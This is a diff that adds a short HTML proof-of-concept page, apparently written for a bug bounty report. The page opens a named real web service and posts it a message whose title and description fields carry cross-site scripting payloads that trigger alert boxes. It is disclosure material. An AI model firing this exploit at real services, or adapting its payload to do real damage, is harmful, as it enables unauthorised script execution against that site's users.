@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>PoC</title>
+    </head>
+    <body>
+        <button id="poc" onclick="poc()">poc</button>
+        <script>
+            function poc() {
+                win = window.open(
+                    "https://lightbox.mastercardsend.com/lightbox/"
+                );
+                setTimeout(
+                    () =>
+                        win.postMessage(
+                            win.postMessage(
+                                JSON.stringify({
+                                    key: "bugcrowd",
+                                    title: "<img src=x onerror=alert(1)>",
+                                    desc: "<img src=x onerror=alert(2)>",
+                                }),
+                                "*"
+                            ),
+                            "*"
+                        ),
+                    3000
+                );
+            }
+        </script>
+    </body>
+</html>
